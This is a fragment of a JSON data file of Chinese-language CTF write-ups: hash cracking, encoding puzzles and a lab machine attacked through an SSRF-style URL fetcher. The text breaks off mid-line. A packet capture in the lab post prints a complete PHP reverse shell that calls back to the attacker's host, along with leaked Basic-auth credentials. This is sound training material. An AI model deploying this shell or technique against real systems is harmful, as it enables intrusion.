\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ head -n 1 pass               \n1aaaaa4\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ john --wordlist=pass --format=raw-md5 hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1lordp4          (?)     \n1g 0:00:00:00 DONE (2025-07-05 07:02) 9.090g/s 48041Kp/s 48041Kc/s 48041KC/s 1loqiq4..1lormd4\nUse the '--show --format=Raw-MD5' options to display all of the cracked passwords reliably\nSession completed. \n                      \n```\n\nHMV{1lordp4}sentence", "top": 0, "createdAt": 1751725539, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-05", "dateLabelColor": "#0969da"}, "P131": {"htmlDir": "docs/post/Challenge 054.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 054", "postUrl": "post/Challenge%20054.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/131", "commentNum": 0, "wordCount": 1138, "description": "![image-20250705190326651](https://7r1umphk.github.io/image/20250705190326857.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl -v http://momo.hackmyvm.eu/f0rw4rd  \n* Host momo.hackmyvm.eu:80 was resolved.\n* IPv6: (none)\n* IPv4: 5.45.101.64\n*   Trying 5.45.101.64:80...\n* Connected to momo.hackmyvm.eu (5.45.101.64) port 80\n* using HTTP/1.x\n> GET /f0rw4rd HTTP/1.1\n> Host: momo.hackmyvm.eu\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 301 Moved Permanently\n< Server: nginx/1.18.0\n< Date: Sat, 05 Jul 2025 11:03:36 GMT\n< Content-Type: text/html\n< Content-Length: 169\n< Location: http://momo.hackmyvm.eu/f0rw4rd/\n< Connection: keep-alive\n< \n<html>\n<head><title>301 Moved Permanently</title></head>\n<body>\n<center><h1>301 Moved Permanently</h1></center>\n<hr><center>nginx/1.18.0</center>\n</body>\n</html>\n* Connection #0 to host momo.hackmyvm.eu left intact\n                                                                     \n```\n\n\u8fd9\u6311\u6218\u4e5f\u662f\u89c1\u9b3c\n\n\u4e5f\u662f\u4e0d\u884c\n\nhttps://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackMyVM/Challenges/Web/054\n\n\u5de8\u9b54\u4f6c\u53ef\u4ee5\u590d\u73b0\uff0c\u6211\u590d\u73b0\u4e0d\u4e86\uff0c\u4e0d\u7ba1\u4e86\uff0c\u6401\u7740\n\n```\nHMV{Pay-it-FORWARD-x!}\n```\n\nsentence", "top": 0, "createdAt": 1751725559, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-05", "dateLabelColor": "#0969da"}, "P132": {"htmlDir": "docs/post/Challenge 055.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 055", "postUrl": "post/Challenge%20055.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/132", "commentNum": 0, "wordCount": 397, "description": "![image-20250705214803760](https://7r1umphk.github.io/image/20250705214803963.webp)\n\n```\n<pre> MCZJ/CJ[[J]\\.7\u00bf?;(?9!?-\\/<;\u00bf:=(=6!?-X K: wtf </pre>\n```\n\n\u6709\u70b9\u8c1c\u8bed\u4eba\uff0c\u662fXOR\n\u6211\u7684\u5f3a\u884c\u7406\u89e3\u5c31\u662f\n\u770b\u8d77\u6765\u4e71\uff0c\u4f46\u90fd\u662fASCII\u53ef\u6253\u5370\u5b57\u7b26\n\u6709key\n\u6709?\n\u6ca1\u6709\u660e\u663e base64/hex \u7279\u5f81\n\n![image-20250705220022860](https://7r1umphk.github.io/image/20250705220022997.webp)\n\n![image-20250705220038576](https://7r1umphk.github.io/image/20250705220039230.webp)\n\nHMV{CAP}sentence", "top": 0, "createdAt": 1751725852, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-05", "dateLabelColor": "#0969da"}, "P133": {"htmlDir": "docs/post/Challenge 056.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 056", "postUrl": "post/Challenge%20056.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/133", "commentNum": 0, "wordCount": 481, "description": "![image-20250705220557455](https://7r1umphk.github.io/image/20250705220557660.webp)\n\n```\n<pre> \u0576\u04bf\u0508\u0ce1\u0c7e\u0b33\u07e6\u03fb\u0767W\u0637\u0ca7\u00c6\u0455\u0c0a\u06f7\u0714\u0464\u0266\u0db0\u02aa\u043a\u0cde\u019d\u0769\u09ac\u0111\u04cc\u0812\u0aac\u0ea2\u0529\u0759\u03c5\u08b2\u06b5\u0854\u0924 Hint: Base what? </pre>\n```\n\n\u63d0\u793abase\n\u5168\u662f Unicode \u5b57\u7b26\n\u660e\u663e\u4e0d\u662f base64\u3001base32\u3001base58 \u7b49\u5e38\u89c1\u7f16\u7801\n\u5305\u542b\u5357\u4e9a,\u963f\u62c9\u4f2f,\u6cf0\u6587\u7b49\u5b57\u7b26\uff1a\u53ef\u80fd\u5c5e\u4e8e**\u201c\u8d85\u5927\u57fa\u6570\u7f16\u7801\u201d**\uff08\u4f8b\u5982 base1024\u3001base2048\uff09\u3002\n\u6240\u4ee5\u6252\u62c9\u5427\n\nhttps://nerdmosis.com/tools/encode-and-decode-base2048\n\n![image-20250705220651285](https://7r1umphk.github.io/image/20250705220651530.webp)\n\n```\nThe flag you are looking for is just 'HMV{Base2048}'\n```\n\nsentence", "top": 0, "createdAt": 1751726000, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-05", "dateLabelColor": "#0969da"}, "P134": {"htmlDir": "docs/post/Challenge 057.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 057", "postUrl": "post/Challenge%20057.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/134", "commentNum": 0, "wordCount": 393, "description": "![image-20250705222109182](https://7r1umphk.github.io/image/20250705222109387.webp)\n\n```\n\u9d77\ud80c\udc65\u9465\u9668\u9a76\ud81a\udd5f\ud80c\udf6f\u975f\u9a65\u946e\ud808\udd72\u6c6a\u6f5f\u1529 Ex: HMV{Flag}\n```\n\n\u5b57\u7b26\u4f9d\u7136\u662f\u8d85\u5bbd Unicode\uff0c\u5f88\u50cf\u4e0a\u9053\u9898\u3002\n\u542b\u6709\u591a\u79cd\u8bed\u7cfb\u5b57\u7b26 \u6c49\u5b57\u3001\u57c3\u53ca\u8c61\u5f62\u3001\u963f\u62c9\u4f2f\u3001\u7f55\u89c1 CJK \u6269\u5c55\n\nhttps://www.better-converter.com/Encoders-Decoders/Base65536-Decode\n\n![image-20250705222147026](https://7r1umphk.github.io/image/20250705222147304.webp)\n\n```\nwhere_have_you_been_rpj7_:)\n```\n\n\u5c0f\u5f69\u86cb\uff0c\u4e4b\u524d\u90a3\u4e2a\u51fabase2048\u7684\u5c31\u662frpj7sentence", "top": 0, "createdAt": 1751726112, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-05", "dateLabelColor": "#0969da"}, "P135": {"htmlDir": "docs/post/nei-bu-_Basic.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Basic", "postUrl": "post/nei-bu-_Basic.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/135", "commentNum": 0, "wordCount": 30147, "description": "![image-20250707214716346](https://7r1umphk.github.io/image/20250707214716465.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sudo arp-scan -l                    \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.167 08:00:27:f0:d8:81       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:e7:e4:00       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded\n```\n\n167\u7684\n\n\u63a2\u6d4b\u4e00\u4e0b\u670d\u52a1\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nmap -p- 192.168.205.167\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 09:30 EDT\nNmap scan report for 192.168.205.167\nHost is up (0.00010s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:F0:D8:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.28 seconds\n```\n\n\u770b\u770b80\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.167\n<!DOCTYPE html>\n<html>\n<head>\n    <title>HTTP Requester</title>\n    <style>\n        body {\n            font-family: Arial, sans-serif;\n            max-width: 800px;\n            margin: 0 auto;\n            padding: 20px;\n            background-color: #f5f5f5;\n        }\n        .container {\n            background-color: white;\n            padding: 20px;\n            border-radius: 8px;\n            box-shadow: 0 2px 10px rgba(0,0,0,0.1);\n        }\n        h1 {\n            color: #333;\n            border-bottom: 2px solid #eee;\n            padding-bottom: 10px;\n        }\n        form {\n            margin: 20px 0;\n            display: flex;\n            gap: 10px;\n        }\n        input[type='text'] {\n            flex: 1;\n            padding: 10px;\n            border: 1px solid #ddd;\n            border-radius: 4px;\n        }\n        button {\n            padding: 10px 20px;\n            background-color: #4CAF50;\n            color: white;\n            border: none;\n            border-radius: 4px;\n            cursor: pointer;\n        }\n        button:hover {\n            background-color: #45a049;\n        }\n        .result-box {\n            margin-top: 20px;\n            padding: 15px;\n            background-color: #f9f9f9;\n            border-left: 4px solid #ccc;\n        }\n        nav {\n            margin-top: 30px;\n            display: flex;\n            gap: 15px;\n        }\n        nav a {\n            padding: 8px 16px;\n            background-color: #e0e0e0;\n            border-radius: 4px;\n            text-decoration: none;\n            color: #333;\n        }\n        nav a:hover {\n            background-color: #d0d0d0;\n        }\n        pre {\n            max-height: 300px;\n            overflow: auto;\n            padding: 15px;\n            background-color: #f8f8f8;\n            border: 1px solid #e0e0e0;\n            border-radius: 4px;\n            white-space: pre-wrap;\n        }\n    </style>\n</head>\n<body>\n    <div class='container'>\n        <h1>Website Request Tool</h1>\n        <form method='POST'>\n            <input type='text' name='url' placeholder='Enter URL starting with http' required>\n            <button type='submit'>Fetch Content</button>\n        </form>\n        \n        <div class='result-box'>\n            <h3>Current target:</h3>\n            No request made        </div>\n        \n        <div class='result-box'>\n            <h3>Response:</h3>\n                            <p>Submit URL to test connection</p>\n                    </div>\n        \n        <nav>\n            <a href='home.php'>Home</a>\n            <a href='about.php'>About</a>\n            <a href='dashboard.php'>Dashboard</a>\n        </nav>\n    </div>\n</body>\n</html>\n```\n\n![image-20250707214425237](https://7r1umphk.github.io/image/20250707214432940.webp)\n\n\u5c1d\u8bd5\u8bbf\u95ee\u53cd\u5f39shell\n\n![image-20250707214553039](https://7r1umphk.github.io/image/20250707214553216.webp)\n\n\u6ca1\u89e3\u6790\n\n\u67e5\u770b\u672c\u5730\u6587\u4ef6\n\n![image-20250707214628218](https://7r1umphk.github.io/image/20250707214628414.webp)\n\n\u770b\u4e86home\uff0cabout\uff0cdashboard\uff0c\u8fd8\u5c1d\u8bd5\u4e86\u4e00\u4e0b167\u7684ip\uff0c\u90fd\u6ca1\u6709\u4ec0\u4e48\u4e1c\u897f\n\n\u6293\u4e2a\u5305\u770b\u770b\n\n![image-20250707214846154](https://7r1umphk.github.io/image/20250707214846404.webp)\n\n\u6ca1\u5565\u4e1c\u897f\n\n\u7136\u540e\u8fd9\u91cc\u6d4b\u8bd5\u4e86\u5f88\u591a\uff0c\u540e\u9762\u53d1\u73b0\u662f\u5b83\u53d1\u9001\u7684\u5934\u6709\u4e1c\u897f\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo tcpdump -A host 192.168.205.167\n[sudo] kali \u7684\u5bc6\u7801\uff1a\n\u5bf9\u4e0d\u8d77\uff0c\u8bf7\u91cd\u8bd5\u3002\n[sudo] kali \u7684\u5bc6\u7801\uff1a\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n09:50:18.143873 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [S], seq 1359019690, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0\nE..4.\n@..............7.PQ...........................\n09:50:18.144240 IP 192.168.205.167.http > 192.168.205.1.60727: Flags [S.], seq 1762610671, ack 1359019691, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0\nE..4..@.@............P.7i.M.Q.......c...............\n09:50:18.144526 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [.], ack 1, win 513, length 0\nE..(..@..............7.PQ...i.M.P.............\n09:50:18.144722 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [P.], seq 1:557, ack 1, win 513, length 556: HTTP: POST / HTTP/1.1\nE..T..@..............7.PQ...i.M.P...S...POST / HTTP/1.1\nHost: 192.168.205.167\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 26\nOrigin: http://192.168.205.167\nConnection: keep-alive\nReferer: http://192.168.205.167/\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nurl=http%3A%2F%2F127.0.0.1\n09:50:18.144954 IP 192.168.205.167.http > 192.168.205.1.60727: Flags [.], ack 557, win 501, length 0\nE..(@.@.@..9.........P.7i.M.Q...P.............\n09:50:18.147613 IP 192.168.205.167.http > 192.168.205.1.60727: Flags [P.], seq 1:1381, ack 557, win 501, length 1380: HTTP: HTTP/1.1 200 OK\nE...@.@.@............P.7i.M.Q...P....w..HTTP/1.1 200 OK\nDate: Mon, 07 Jul 2025 13:50:18 GMT\nServer: Apache/2.4.62 (Debian)\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 1127\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html; charset=UTF-8\n\n...........XKo.6...W.\n...*....*.. ..=.. ..(..h...J...b.E.{....(.m....!.9..f8.....w....>...(..,n.`..3 .X.....r......s.Y..Y#..K....E/...S=kZ\n.....D..............%[...%Hd......p.mH.......Z..'.&.W.m+...a...........jtb..o....I......mF.>..e.3.ADj.....|.AD....j.B....\n~;{..e...r...6^..s'......6.iN.8...I+.Z.u.......1.......^.P&.:...l`5m..U-~./.....        ..a.I}r..q...!W.. ..........*.p,......... \\..../i.\\q..:k.....R^.i...>.q....pv..y...u.d...9..Z..J...1..... .x-t..3N.........G._M..;W..8.*7......x..?;uui|.S.. .l...,.........RS1<\n...0.dB.z.kep...x....(7j.Z..Mx...y.S.)..-....8.w.80=6V.r.H.y.i.9.....u.5.......L.....\\.\n{R...Xd..y..>/{*.....WH.....f..dN.8..t..{......G..dB..l..$Y.....@.F...bh..zU..%..H3. .....#...(..w...IWI..e...fL......H.dn.).Q..W?\\...;.......yEK..6.O,.'....E..6..L...2=....&4.R36.SKA..J.4kg.s.e'^..y.....D.5.............C;...fh..v.S...X}.>j...(....).i5a..C5.br.X8...tF..u........dC...d|..>.3S...~SC....4.......8.v.......5k-.........jz..M....?Q..:..'la...\n..VN..>J.RR.u...        *k.D-S....)Z[5..u.d.q.. cx..3....................~..... .V.2d.x.L;....kV Lr6...H...@.zg0'.ZHC...{.^.8/Q...8!...Kth.%.`xI..kG........0.../....I..*...\n09:50:18.197232 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [.], ack 1381, win 507, length 0\nE..(..@..............7.PQ...i.STP.............\n09:50:22.378643 IP 192.168.205.167.bootpc > 192.168.205.254.bootps: BOOTP/DHCP, Request from 08:00:27:f0:d8:81 (oui Unknown), length 300\nE..H..@.@............D.C.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5....Basic7.......w.,/.y*=..'......./l....'-.H..............\n09:50:22.379024 IP 192.168.205.254.bootps > 192.168.205.167.bootpc: BOOTP/DHCP, Reply, length 300\nE..H.................C.D.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5..6.....3.........................localdomain......,.......\n09:50:23.159139 IP 192.168.205.167.http > 192.168.205.1.60727: Flags [F.], seq 1381, ack 557, win 501, length 0\nE..(@.@.@..7.........P.7i.STQ...P.... ........\n09:50:23.159439 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [.], ack 1382, win 507, length 0\nE..(..@..............7.PQ...i.SUP.............\n09:50:23.999242 IP 192.168.205.1.60742 > 192.168.205.167.http: Flags [S], seq 2328306649, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0\nE..4..@..............F.P..#.........................\n09:50:23.999577 IP 192.168.205.167.http > 192.168.205.1.60742: Flags [S.], seq 4258427036, ack 2328306650, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0\nE..4..@.@............P.F..p...#.....Mn..............\n09:50:23.999823 IP 192.168.205.1.60742 > 192.168.205.167.http: Flags [.], ack 1, win 513, length 0\nE..(..@..............F.P..#...p.P....0........\n09:50:23.999943 IP 192.168.205.1.60742 > 192.168.205.167.http: Flags [P.], seq 1:573, ack 1, win 513, length 572: HTTP: POST / HTTP/1.1\nE..d..@..............F.P..#...p.P.......POST / HTTP/1.1\nHost: 192.168.205.167\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 46\nOrigin: http://192.168.205.167\nConnection: keep-alive\nReferer: http://192.168.205.167/\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nurl=http%3A%2F%2F192.168.205.128%2Freverse.php\n09:50:24.000119 IP 192.168.205.167.http > 192.168.205.1.60742: Flags [.], ack 573, win 501, length 0\nE..(.Q@.@.s..........P.F..p...&.P.............\n09:50:24.000772 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [S], seq 726111212, win 64240, options [mss 1460,sackOK,TS val 2885018455 ecr 0,nop,wscale 7], length 0\nE..<..@.@.G5...........P+G..........D..........\n...W........\n09:50:24.000797 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [S.], seq 2197022970, ack 726111213, win 65160, options [mss 1460,sackOK,TS val 1602276764 ecr 2885018455,nop,wscale 7], length 0\nE..<..@.@..C.........P......+G.................\n_......W....\n09:50:24.000931 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 0\nE..4..@.@.G<...........P+G...........W.....\n...X_...\n09:50:24.000978 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [P.], seq 1:153, ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 152: HTTP: GET /reverse.php HTTP/1.1\nE.....@.@.F............P+G..........x0.....\n...X_...GET /reverse.php HTTP/1.1\nHost: 192.168.205.128\nAccept: */*\nAuthorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==\n\n\n09:50:24.000983 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [.], ack 153, win 508, options [nop,nop,TS val 1602276764 ecr 2885018456], length 0\nE..4.9@.@.|..........P......+G.............\n_......X\n09:50:24.002659 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [P.], seq 1:203, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018456], length 202: HTTP: HTTP/1.0 200 OK\nE....:@.@.{F.........P......+G.......j.....\n_......XHTTP/1.0 200 OK\nServer: SimpleHTTP/0.6 Python/3.13.3\nDate: Mon, 07 Jul 2025 13:50:24 GMT\nContent-type: application/octet-stream\nContent-Length: 2596\nLast-Modified: Thu, 26 Jun 2025 12:22:10 GMT\n\n\n09:50:24.002881 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [.], ack 203, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0\nE..4..@.@.G:...........P+G.................\n...Z_...\n09:50:24.003021 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [P.], seq 203:2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 2596: HTTP\nE.\nX.;@.@.q..........P......+G......&......\n_......Z<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = '1.0';\n$ip = '192.168.205.128';\n$port = 8888;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/bash -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n        $pid = pcntl_fork();\n\n        if ($pid == -1) {\n                printit('ERROR: Can't fork');\n                exit(1);\n        }\n\n        if ($pid) {\n                exit(0);  // Parent exits\n        }\n        if (posix_setsid() == -1) {\n                printit('Error: Can't setsid()');\n                exit(1);\n        }\n\n        $daemon = 1;\n} else {\n        printit('WARNING: Failed to daemonise.  This is quite common and not fatal.');\n}\n\nchdir('/');\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n        printit('$errstr ($errno)');\n        exit(1);\n}\n\n$descriptorspec = array(\n   0 => array('pipe', 'r'),  // stdin is a pipe that the child will read from\n   1 => array('pipe', 'w'),  // stdout is a pipe that the child will write to\n   2 => array('pipe', 'w')   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n        printit('ERROR: Can't spawn shell');\n        exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit('Successfully opened reverse shell to $ip:$port');\n\nwhile (1) {\n        if (feof($sock)) {\n                printit('ERROR: Shell connection terminated');\n                break;\n        }\n\n        if (feof($pipes[1])) {\n                printit('ERROR: Shell process terminated');\n                break;\n        }\n\n        $read_a = array($sock, $pipes[1], $pipes[2]);\n        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n        if (in_array($sock, $read_a)) {\n                if ($debug) printit('SOCK READ');\n                $input = fread($sock, $chunk_size);\n                if ($debug) printit('SOCK: $input');\n                fwrite($pipes[0], $input);\n        }\n\n        if (in_array($pipes[1], $read_a)) {\n                if ($debug) printit('STDOUT READ');\n                $input = fread($pipes[1], $chunk_size);\n                if ($debug) printit('STDOUT: $input');\n                fwrite($sock, $input);\n        }\n\n        if (in_array($pipes[2], $read_a)) {\n                if ($debug) printit('STDERR READ');\n                $input = fread($pipes[2], $chunk_size);\n                if ($debug) printit('STDERR: $input');\n                fwrite($sock, $input);\n        }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n        if (!$daemon) {\n                print '$string\\n';\n        }\n}\n\n?>\n\n09:50:24.003100 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [F.], seq 2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 0\nE..4.=@.@.|..........P......+G.............\n_......Z\n09:50:24.003289 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [.], ack 2799, win 496, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0\nE..4..@.@.G9...........P+G.................\n...Z_...\n09:50:24.003466 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [F.], seq 153, ack 2800, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0\nE..4..@.@.G8...........P+G.................\n...Z_...\n09:50:24.003474 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [.], ack 154, win 508, options [nop,nop,TS val 1602276767 ecr 2885018458], length 0\nE..4.>@.@.|..........P......+G.............\n_......Z\n09:50:24.003898 IP 192.168.205.167.http > 192.168.205.1.60742: Flags [P.], seq 1:2113, ack 573, win 501, length 2112: HTTP: HTTP/1.1 200 OK\nE....R@.@............P.F..p...&.P.......HTTP/1.1 200 OK\nDate: Mon, 07 Jul 2025 13:50:24 GMT\nServer: Apache/2.4.62 (Debian)\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 1859\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html; charset=UTF-8\n\n...........X}o.6...|.....R!@..G.[....M...6M..L........n....v.!.J7R)........W..n.~...H'.UcT.(    .....f:.W....aB?gTi*G.[u.J?...7.....z5.Pp.      I...!\\KF..P.........    Yv.,....z.tY..s.....i.... `|>........Rd<..'.r...ss......>.K.....6.'b........I..)To{..Q.   ..(8H..G....i.N.....D...Q.-OOOke.       .E2.L..Y..)..dE..Ph.<.2../.dl..M...4&..aL+...t7...L...R:nj.....Q.xx|.;.;..;k..A..eg...2.........<..~.^1..H+......Km13..h*..t...0._.H..g..w..6.$UY.1...1..'.......I....5BLCmMP....:A9..G..-......X1|..P.09...\n...^.u.4...B....5.S[6*....A.\\u0..[.^v'...6....a...,..............6C;*%>...;.I...#/..#....i.y#....c....jA.uc.E....L!......1B.KT..'TG'.7..>=. ,.-.P*.....3.7.c....Q.q..T..e.3(M.F3.......6A..L.....C...Y.t..=.~.7...z.9.....z...(.d]I..E.W7....(...!..t...<....A...Ew.;.......[.v.(]..L..,..R.......a.\\....w(@...o.\\&..h.C....v.>....1MP[.......}....E...,Mi.Z..Y.L........5.BKH......,.1.w...'.R|..J...O..D^B......u....4....6.........[.S.h(...%t.......9...N>.x.....s&.e..s...R...w....S..$.......o~....b.S\\...0.....iJp.gq..TJ!.......d\nt.%,........fDE.a+......2,.:.....Bh......t..V-w*...........\nyt.b1..z..V9j....7.N.....{9.-g....n2.......m....r.-3L.}-#:,....@o...XfMYjC.\n..St.bA..G.c..9.3;dA.W..Q.+.X.nQ...z....?..=a..tw.a..<DL..a..b.1m.      ....%.&qw..y.Q.d...6......D..w....;BrN..1D...........y.6.......c^.`{C<c.W.`{[....b..,.2.....|.s-.J....).S........e....,...$.&...X7+.m....!.........8...i .eA(Eb...b..2..{.s.I..5L./b...4..L.w.S)|...5|.:/..G.m..x.AU;..WLM...L..U..k....8+,8X6.>.(.$1i6...,..[.....N.D.....$.}$&<.vcS.O.o...B>...&`...^b:b..m...    '..B..\n[.......'...:.p..       .D..TDf..c^B...%../B.Y.c...E....T2.....1.....>....b...+...T+...yGr..........Z.O7....~.........n~...........t.....QZ...Cp(%...P.TG..yg.F.l..........)....E..Rn.g...L.......T.D~.:.P..B...X....Z.o/.....X..'Fq1.....f^..UUx.O.....|N.'/.@'.w.E.....k....=~.V.w........~.4.>...#;.....#.6..)...g...Q.+^7N...H....d...[..o._$..C....\n09:50:24.004210 IP 192.168.205.1.60742 > 192.168.205.167.http: Flags [.], ack 2113, win 513, length 0\nE..(..@..............F.P..&...x.P...|.........\n^C\n30 packets captured\n30 packets received by filter\n0 packets dropped by kernel\n                     \n```\n\nAuthorization: Basic 